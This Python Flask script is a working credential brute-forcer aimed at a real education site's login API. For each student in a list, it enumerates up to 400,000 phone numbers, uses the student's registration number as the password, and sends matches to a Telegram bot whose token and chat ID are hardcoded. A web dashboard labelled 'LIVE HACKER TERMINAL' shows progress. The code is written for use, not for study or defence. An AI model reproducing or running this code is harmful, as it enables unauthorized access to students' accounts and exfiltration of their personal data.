import os
import time
import asyncio
import aiohttp
from flask import Flask, jsonify, render_template_string
import threading

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845557626:AAHyHv_BNpKS8OG-YVphwMSthEorIncWtmM")
CHAT_ID = os.environ.get("CHAT_ID", "1634075045")

API_URL = "https://www.eduintern.in/api/auth/login"
FILE_NAME = "students.txt" 

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://www.eduintern.in",
    "Referer": "https://www.eduintern.in/login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0"
}

# LIVE STATUS VARIABLES
live_logs = []
current_reg = "Starting..."
total_scanned = 0
total_to_scan = 400000

def add_log(text):
    global live_logs
    log_line = f"[{time.strftime('%H:%M:%S')}] {text}"
    live_logs.append(log_line)
    if len(live_logs) > 30: live_logs.pop(0)
    print(log_line, flush=True)

def send_telegram_msg(text):
    import requests
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": CHAT_ID, "text": text}, timeout=5)
    except: pass

async def check_number(session, phone, reg_no, semaphore):
    async with semaphore:
        try:
            async with session.post(API_URL, json={"phone": phone, "password": reg_no}, headers=HEADERS, timeout=8) as r:
                data = await r.json() if r.text else {}
                success = "student" in data or "user" in data or ("token" in data and "name" in data)
                return {"status": r.status, "success": success, "phone": phone}
        except Exception:
            return {"status": "ERROR", "success": False, "phone": phone}

async def process_student(index, reg_no, last4):
    global current_reg, total_scanned, total_to_scan
    current_reg = f"[{index}] Reg: {reg_no} (Ends: {last4})"
    total_scanned = 0
    
    add_log("==========================================")
    add_log(f"TARGET START: {reg_no} (Ending: {last4})")
    add_log("==========================================")
    
    semaphore = asyncio.Semaphore(20) # 20 parallel requests
    
    async with aiohttp.ClientSession() as session:
        # Hum ek saath 4 lakh nahi bhejenge, hum chunk me bhejenge
        for digit in ['6', '7', '8', '9']:
            for chunk_start in range(0, 100000, 1000): # 1000 ka chunk
                if total_scanned >= 400000: break
                
                tasks = []
                for i in range(chunk_start, chunk_start + 1000):
                    phone = f"{digit}{i:05d}{last4}"
                    tasks.append(check_number(session, phone, reg_no, semaphore))
                
                results = await asyncio.gather(*tasks)
                
                for res in results:
                    total_scanned += 1
                    if res["success"]:
                        add_log(f"✅ MATCH FOUND! Phone: {res['phone']}")
                        send_telegram_msg(f"[{index}] {reg_no}    {res['phone']}  sus")
                        return True # Found! Stop scanning
                    
                    # Har 5000 scan pe log
                    if total_scanned % 5000 == 0:
                        add_log(f"[{total_scanned}/{total_to_scan}] 📞 {res['phone']} → Status: {res['status']}")

    add_log(f"❌ NO MATCH for {reg_no}")
    send_telegram_msg(f"[{index}] {reg_no}    no match number found")
    return False

def run_hunter():
    time.sleep(3)
    try:
        with open(FILE_NAME, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
            
        add_log(f"Total {len(lines)} students mil gaye. Scanning shuru...")
        send_telegram_msg(f"🚀 Script start! Total {len(lines)} students.")
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        for i, line in enumerate(lines, start=1):
            parts = line.split()
            if len(parts) >= 2:
                found = loop.run_until_complete(process_student(i, parts[0], parts[1]))
                if found:
                    pass # Agla student scan karo
                    
        send_telegram_msg("✅ Saare students process ho gaye!")
    except Exception as e:
        add_log(f"Error: {e}")

@app.route('/')
def home():
    return render_template_string("""
    <html>
    <head>
        <title>Live Scanner</title>
        <style>
            body { background-color: #0d1117; color: #00ff00; font-family: 'Consolas', monospace; margin: 0; padding: 20px; }
            h3 { color: #ffffff; border-bottom: 1px solid #333; padding-bottom: 10px; }
            .stats { color: #00bfff; font-size: 18px; margin-bottom: 20px; }
            #terminal { background-color: #000; padding: 15px; border-radius: 5px; border: 1px solid #333; height: 70vh; overflow-y: auto; box-shadow: 0 0 10px rgba(0, 255, 0, 0.2); }
            .log-line { margin: 2px 0; font-size: 14px; }
            .success { color: #00ff00; font-weight: bold; }
            .error { color: #ff3333; }
        </style>
        <script>
            setInterval(function() {
                fetch('/logs').then(r => r.json()).then(data => {
                    document.getElementById('reg').innerText = data.current_reg;
                    document.getElementById('scanned').innerText = data.scanned;
                    document.getElementById('total').innerText = data.total;
                    let term = document.getElementById('terminal');
                    term.innerHTML = '';
                    data.logs.forEach(line => {
                        let div = document.createElement('div');
                        div.className = 'log-line';
                        if(line.includes('✅')) div.classList.add('success');
                        else if(line.includes('❌') || line.includes('ERROR')) div.classList.add('error');
                        div.innerText = line;
                        term.appendChild(div);
                    });
                    term.scrollTop = term.scrollHeight;
                });
            }, 3000);
        </script>
    </head>
    <body>
        <h3>💻 LIVE HACKER TERMINAL</h3>
        <div class="stats">
            <b>Target:</b> <span id="reg" style="color:#fff;">{{ current_reg }}</span><br>
            <b>Scanned:</b> <span id="scanned" style="color:#fff;">{{ total_scanned }}</span> / <span id="total" style="color:#fff;">{{ total_to_scan }}</span>
        </div>
        <div id="terminal"><div class="log-line">Loading...</div></div>
    </body>
    </html>
    """, current_reg=current_reg, total_scanned=total_scanned, total_to_scan=total_to_scan)

@app.route('/logs')
def get_logs():
    return jsonify({"current_reg": current_reg, "scanned": total_scanned, "total": total_to_scan, "logs": live_logs})

if __name__ == "__main__":
    threading.Thread(target=run_hunter, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
